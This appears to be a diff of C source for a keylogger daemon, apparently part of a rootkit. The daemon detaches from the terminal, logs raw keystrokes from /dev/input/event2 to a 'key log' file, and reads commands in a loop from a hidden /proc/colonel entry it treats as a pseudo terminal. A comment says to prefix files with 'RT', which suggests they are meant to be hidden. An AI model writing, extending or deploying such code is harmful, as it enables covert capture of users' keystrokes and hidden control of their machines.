@@ -54,19 +54,19 @@ int main(void) {
 		exit(1);
 	}
 
-	chdir("/opt/");					/* change daemon working directory */
+	// chdir("/opt/");					/* change daemon working directory */
 
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
-
+// MAKE ALL FILES AND DIRECTORIES WITH PREFIX RT !!!!!!!!!!
 	time_t curtime;
 	time(&curtime);
-	dir = mkdir("./.log", S_IRWXU);				/* log directory */
-	fp = fopen("./.log/.log.txt", "a+"); 		/* daemon log */
-	evlog = fopen("./.log/.evlog.txt", "a+");  	/* key log */
+	dir = mkdir("./log", S_IRWXU);				/* log directory */
+	fp = fopen("./log/log.txt", "a+"); 		/* daemon log */
+	evlog = fopen("./log/evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
-	ftty = fopen("/proc/cpuinfo","r");			/* will act as pseudo terminal */
+	ftty = fopen("/proc/colonel","r");			/* will act as pseudo terminal */
 	if (!ftty) {
 		fprintf(fp, "%s -- ERROR: /proc/colonel not found", ctime(&curtime));
 		return 1;
@@ -90,8 +90,6 @@ int main(void) {
 			unameData.nodename, unameData.version,
 			unameData.sysname, unameData.release, 
 			unameData.machine);
-
-
 
 	while(1) {
 		fgets(cmd, sizeof(cmd), ftty);
